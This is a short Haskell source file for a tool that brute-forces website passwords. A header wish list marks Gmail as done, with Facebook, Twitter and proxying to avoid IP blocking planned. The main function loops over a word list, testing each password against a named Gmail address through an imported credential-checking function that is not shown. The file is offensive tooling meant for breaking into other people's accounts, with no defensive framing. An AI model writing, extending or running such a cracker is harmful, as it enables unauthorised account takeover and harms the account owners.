---------------------------------------------------------------------
-- crackers.hs
-- By:
--
-- ___  ___
-- |  \/  |
-- | .  . | ___  _ __ ___   ___
-- | |\/| |/ _ \| '_ ` _ \ / _ \
-- | |  | | (_) | | | | | | (_) |
-- \_|  |_/\___/|_| |_| |_|\___/
--
--
-- Brute force website password crackers
--
-- Wish list:
--
--   [X] Gmail
--   [] Facebook
--   [] Twitter
--
-- Other features and things to do:
--
--   [X] Build in word list
--   [] Custom word list param
--   [] Proxy requests so that IP doesn't get blocked
--
-- Suggest another at: https://github.com/mom0/crackers/issues
--
---------------------------------------------------------------------

import Crackers.Gmail

data Crack = Cracked String | NotCracked deriving (Show)

printShow s = putStrLn $ show s

findPassword :: (String -> IO (String, Bool)) -> [String] -> IO Crack
findPassword f [] = do return (NotCracked)
findPassword f (p:ps) = do
    (password, works) <- f p

    if works then return (Cracked password) else findPassword f ps

main :: IO ()
main = do
    passwords <- readFile "data/wordlist.txt"

    result <- (findPassword (gmailCredsWork "hacksmomo@gmail.com") (lines passwords))

    printShow (result)
